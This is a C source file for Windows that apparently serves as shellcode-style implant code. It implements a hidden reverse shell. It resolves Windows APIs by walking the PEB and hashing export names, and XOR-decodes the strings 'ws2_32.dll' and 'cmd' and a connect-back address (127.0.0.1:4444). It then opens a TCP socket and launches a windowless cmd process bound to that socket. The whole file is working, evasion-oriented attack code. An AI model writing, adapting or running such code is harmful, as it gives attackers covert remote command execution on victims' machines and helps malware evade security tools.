#include "structs.h"
#include <stdio.h>

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

#define KEY1 0x1d
#define KEY2 0x9d
#define KEY3 0x45

#define SEED                130
#define LOADLIBRARYA_H      2490052624
#define CREATEPROCESSA_H    2301677988
#define WSASTARTUP_H        559900886
#define WSASOCKETA_H        1384560375
#define CONNECT_H           2088465164

#define LOSELOSE_HASH(s, hash) do {                   \
    (hash) = 0;                                       \
    const char *_p = (s);                             \
    int _c;                                           \
    while ((_c = (unsigned char)(*_p++))) {           \
        (hash) += _c;                                 \
        (hash) *= (_c + SEED);                        \
    }                                                 \
} while (0)

#ifndef ARRAYSIZE
#define ARRAYSIZE(a)            (sizeof(a)/sizeof((a)[0]))
#endif

#define XOR_ARRAY(buf, key)       xor_n((buf), ARRAYSIZE(buf), (key))

/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

static inline __attribute__((always_inline)) unsigned char xor8(unsigned char x, unsigned char y) {
	return x ^ y ;
}

static inline __attribute__((always_inline)) void xor_n(unsigned char *buf, size_t n, unsigned char key) {
    for (size_t i = 0; i < n; ++i)
		buf[i] = xor8(buf[i], key);
}

static FARPROC ResolveApiByHash(DWORD64 qwApiHash) {
    PIMAGE_EXPORT_DIRECTORY pImgExportDir;
    DWORD dwFunctionNumber, dwHash;
    PDWORD pdwFuncNameBase;
    PCSTR pszFunctionName;
    WORD  wOrdinalIndex;

    // x64: GS:[0x60] -> PEB (via TEB). PEB holds loader state + module lists.
    PPEB pPEB = (PPEB)__readgsqword(0x60);

    // PEB->Ldr -> PEB_LDR_DATA, contains linked lists of loaded modules (EXE + DLLs).
    PPEB_LDR_DATA Ldr = (PPEB_LDR_DATA)pPEB->Ldr;

    // Walk InLoadOrderModuleList (circular list). Entries are LDR_DATA_TABLE_ENTRY.
    PLDR_DATA_TABLE_ENTRY DataTableEntry =
        (PLDR_DATA_TABLE_ENTRY)Ldr->InLoadOrderModuleList.Flink;

    while (DataTableEntry->DllBase != NULL)
    {
        // DllBase = module image base address in memory.
        DWORD64 qwModuleBase = (DWORD64)DataTableEntry->DllBase;

        // Parse PE headers: DOS -> e_lfanew -> NT headers.
        PIMAGE_NT_HEADERS pImgNtHdrs =
            (PIMAGE_NT_HEADERS)(qwModuleBase + ((PIMAGE_DOS_HEADER)qwModuleBase)->e_lfanew);

        // Export directory RVA (DataDirectory[EXPORT]).
        DWORD dwExportDirRVA =
            pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        // Advance to next module now (safe for continue).
        DataTableEntry =
            (PLDR_DATA_TABLE_ENTRY)DataTableEntry->InLoadOrderLinks.Flink;

        // No exports -> skip.
        if (dwExportDirRVA == 0)
            continue;

        // RVA->VA: export directory lives at moduleBase + RVA.
        pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(qwModuleBase + dwExportDirRVA);

        // Export tables: names[] -> ordinals[] -> functions[] (all RVAs).
        dwFunctionNumber = pImgExportDir->NumberOfNames;
        pdwFuncNameBase  = (PDWORD)((PCHAR)qwModuleBase + pImgExportDir->AddressOfNames);

        for (DWORD idx = 0; idx < dwFunctionNumber; idx++)
        {
            // names[idx] is an RVA to an ASCII function name string.
            pszFunctionName = (PCSTR)(qwModuleBase + *pdwFuncNameBase++);
            LOSELOSE_HASH(pszFunctionName, dwHash);

            if (dwHash == qwApiHash)
            {
                // ordinals[idx] maps name->function index.
                wOrdinalIndex =
                    *(PWORD)(qwModuleBase + pImgExportDir->AddressOfNameOrdinals + (idx * sizeof(WORD)));

                // functions[ordinal] is an RVA to the implementation. Return VA.
                return (FARPROC)(qwModuleBase +
                    *(PDWORD)(qwModuleBase + pImgExportDir->AddressOfFunctions + (wOrdinalIndex * sizeof(DWORD))));
            }
        }
    }

    // Not found in any loaded module exports.
    return NULL;
}


/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void Main(void) {
    
	unsigned char addr[] = {0xe2, 0x9d, 0x9d, 0x9c, 0x8c, 0xc1, 0x9d};

	
	char ws2_32_dll[] = {0x6a, 0x6e, 0x2f, 0x42, 0x2e, 0x2f, 0x33, 0x79, 0x71, 0x71, 0x1d};
	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key


	char shell[] = {0x26, 0x28, 0x21, 0x45};
	//	 cmd	  0x63, 0xcd, 0x64, key
	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key

	RUNTIME_CONTEXT ctx = { 0 };
	ctx.api.pLoadLibraryA = (PLOADLIBRARYA)ResolveApiByHash(LOADLIBRARYA_H);
	XOR_ARRAY(ws2_32_dll, KEY1);
	ctx.api.pLoadLibraryA(ws2_32_dll);
	ctx.api.pWSAStartup = (PWSASTARTUP)ResolveApiByHash(WSASTARTUP_H);
	ctx.api.pWSAStartup(MAKEWORD(2, 2), &ctx.winsock.wsadata);
	ctx.api.pWSASocketA = (PWSASOCKETA)ResolveApiByHash(WSASOCKETA_H);
	ctx.winsock.socket = ctx.api.pWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
	ctx.winsock.sa.sin_family = AF_INET;
	XOR_ARRAY(addr, KEY2);
	((unsigned char *)&ctx.winsock.sa.sin_port)[0] = addr[4];
	((unsigned char *)&ctx.winsock.sa.sin_port)[1] = addr[5];
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b1 = addr[0]; 
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b2 = addr[1]; 
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b3 = addr[2]; 
	ctx.winsock.sa.sin_addr.S_un.S_un_b.s_b4 = addr[3]; 
	ctx.api.pConnect = (PCONNECT)ResolveApiByHash(CONNECT_H);
	ctx.api.pConnect(ctx.winsock.socket, (struct sockaddr*)&ctx.winsock.sa, sizeof(ctx.winsock.sa)); 
	ctx.process.si.cb = sizeof(ctx.process.si);
	ctx.process.si.dwFlags = (STARTF_USESTDHANDLES);
	ctx.process.si.hStdInput = (HANDLE)ctx.winsock.socket;
	ctx.process.si.hStdOutput = (HANDLE)ctx.winsock.socket;
	ctx.process.si.hStdError = (HANDLE)ctx.winsock.socket;
	XOR_ARRAY(shell, KEY3);
	ctx.api.pCreateProcessA = (PCREATEPROCESSA)ResolveApiByHash(CREATEPROCESSA_H);
	ctx.api.pCreateProcessA(NULL, (LPSTR)shell, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ctx.process.si, &ctx.process.pi); 

}

